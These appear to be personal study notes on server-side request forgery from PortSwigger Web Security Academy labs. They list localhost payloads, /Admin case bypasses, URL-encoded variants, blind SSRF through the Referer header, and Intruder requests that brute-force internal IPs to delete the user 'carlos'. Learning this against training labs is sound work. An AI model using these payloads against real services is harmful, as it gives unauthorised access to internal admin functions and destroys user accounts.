SSRF most common with stock check func that checks an external url as POST 
try different payloads present on burp site:
stockApi=http://127.0.0.1
stockApi=http://127.1
stockApi=http://localhost

then, /admin might be blocked
try /Admin or different bypasses

solution:
stockApi=http://127.1/Admin/delete?username=carlos
stockApi=http%3A%2F%2F127.1%2FAdmin%2Fdelete%3fusername%3dcarlos - url encoded

Also theres stockCheck.js and stockCheckPayload.js when this happens

BLIND SSRF, aka there is no functionalities / what to check as last resort sorta scenario

Use the 
Referer: 
header for different type of payloads, like the burp collaborator server


bruteforce internal IP with intruder

POST /admin/delete HTTP/2
Host: 192.168.0.51

csrf=8H3qAZBfvXgOMDHGhanBv48Wg4bleReq&username=carlos

if doesnt work, try supplying the whole URL as the GET /endpoint 
like so:

GET https://0aeb00bb039759ae80c3d5b000f90077.web-security-academy.net/admin HTTP/2
Host: 192.168.0.ยง1ยง
